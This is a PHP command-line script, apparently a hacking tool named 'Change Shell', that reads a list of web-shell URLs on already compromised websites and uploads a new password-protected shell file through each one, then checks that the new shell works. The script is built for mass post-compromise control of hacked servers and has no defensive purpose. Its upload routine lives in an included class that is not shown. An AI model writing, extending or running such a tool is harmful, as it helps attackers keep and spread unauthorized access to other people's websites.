<?php
error_reporting(0);
require_once("cshell.class.php");
$main = new Main();
echo $main->green.$main->banner.$main->normal;
echo "{$main->green}      Change Shell {$main->normal}| Powered By {$main->green}0x5151\n\n{$main->normal}";
if(empty($argv[1])) {
	echo "{$main->green}[INFO] {$main->normal}Example : \n";
	echo "php cshell.php LIST SHELL PASSWORD\n";
	echo "php $argv[0] list.txt new.php pass";
	return;
}
$p = file_get_contents($argv[1]);
$shell = explode("\n", $p);
foreach ($shell as $list) {
echo "{$main->green}[INFO]{$main->normal} Try Upload -> $list".$main->upload($list, $argv[2], trim($argv[3]))."\n";
echo "{$main->green}[INFO]{$main->normal} Check -> ".$main->check($list, basename($argv[2]));
echo $main->line;
}
